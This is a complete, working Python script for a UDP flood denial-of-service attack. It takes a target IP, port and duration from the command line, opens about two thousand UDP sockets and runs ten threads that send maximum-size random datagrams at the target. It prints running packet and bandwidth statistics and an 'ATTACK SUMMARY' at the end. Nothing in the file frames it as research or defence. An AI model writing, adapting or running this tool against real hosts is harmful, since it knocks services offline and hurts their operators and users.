import socket
import random
import threading
import time
import sys
import struct

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <IP> <PORT> <DURATION>")
    print(f"Example: {sys.argv[0]} 192.168.1.100 80 120")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
attack_duration = int(sys.argv[3])

def create_udp_sockets(count=1000):
    sockets = []
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
            sock.bind(('0.0.0.0', 0))
            sockets.append(sock)
        except:
            pass
    return sockets

def generate_large_packets():
    packets = []
    for _ in range(50):
        size = random.randint(1024, 65507)
        payload = random.randbytes(size)
        packets.append(payload)
    return packets

packet_counter = 0
byte_counter = 0
stop_flag = False
start_time = time.time()
print_lock = threading.Lock()
stats_lock = threading.Lock()

def log_print(msg):
    with print_lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def flood_worker(worker_id, sockets, packets):
    global packet_counter, byte_counter, stop_flag
    socket_index = 0
    while not stop_flag:
        try:
            if socket_index >= len(sockets):
                socket_index = 0
            sock = sockets[socket_index]
            payload = random.choice(packets)
            for _ in range(10):
                sock.sendto(payload, (target_ip, target_port))
                with stats_lock:
                    packet_counter += 1
                    byte_counter += len(payload)
            socket_index += 1
        except:
            pass

def optimized_flood_worker(worker_id, sockets):
    global packet_counter, byte_counter, stop_flag
    payload = random.randbytes(65507)
    while not stop_flag:
        try:
            for sock in sockets:
                for _ in range(3):
                    sock.sendto(payload, (target_ip, target_port))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(payload)
        except:
            pass

def stats_monitor():
    global packet_counter, byte_counter, stop_flag
    while not stop_flag:
        time.sleep(2)
        elapsed = time.time() - start_time
        if elapsed > 0:
            pps = packet_counter / elapsed
            gbps = (byte_counter * 8) / (elapsed * 1000000000)
            log_print(f"Packets: {packet_counter:,} | PPS: {pps:,.0f} | Gbps: {gbps:.2f} | Duration: {int(elapsed)}/{attack_duration}s")

def attack_timer():
    global stop_flag
    time.sleep(attack_duration)
    stop_flag = True
    log_print("Attack duration reached. Stopping...")

if __name__ == "__main__":
    log_print(f"Starting massive UDP flood on {target_ip}:{target_port}")
    log_print("Creating socket pools...")
    
    socket_pools = []
    packet_pools = []
    
    for i in range(10):
        sockets = create_udp_sockets(200)
        socket_pools.append(sockets)
        packets = generate_large_packets()
        packet_pools.append(packets)
        log_print(f"Pool {i+1}: {len(sockets)} sockets ready")
    
    total_sockets = sum(len(pool) for pool in socket_pools)
    log_print(f"Total sockets created: {total_sockets:,}")
    
    threading.Thread(target=attack_timer, daemon=True).start()
    threading.Thread(target=stats_monitor, daemon=True).start()
    
    threads = []
    
    for i in range(5):
        t = threading.Thread(target=flood_worker, args=(i, socket_pools[i], packet_pools[i]), daemon=True)
        t.start()
        threads.append(t)
    
    for i in range(5, 10):
        t = threading.Thread(target=optimized_flood_worker, args=(i, socket_pools[i]), daemon=True)
        t.start()
        threads.append(t)
    
    log_print(f"Started {len(threads)} flood threads")
    
    try:
        while not stop_flag:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        log_print("Interrupted by user")
    
    elapsed = time.time() - start_time
    print("\n" + "="*50)
    print("ATTACK SUMMARY")
    print("="*50)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {elapsed:.1f} seconds")
    print(f"Total packets sent: {packet_counter:,}")
    print(f"Total bytes sent: {byte_counter:,}")
    print(f"Average packets/sec: {packet_counter/elapsed:,.0f}")
    
    if elapsed > 0:
        gbps_total = (byte_counter * 8) / (elapsed * 1000000000)
        print(f"Average bandwidth: {gbps_total:.2f} Gbps")
        mbps_total = (byte_counter * 8) / (elapsed * 1000000)
        print(f"Average bandwidth: {mbps_total:,.0f} Mbps")
    
    print(f"Socket count: {total_sockets}")
    print(f"Thread count: {len(threads)}")
    
    for pool in socket_pools:
        for sock in pool:
            try:
                sock.close()
            except:
                pass
    
    sys.exit(0)
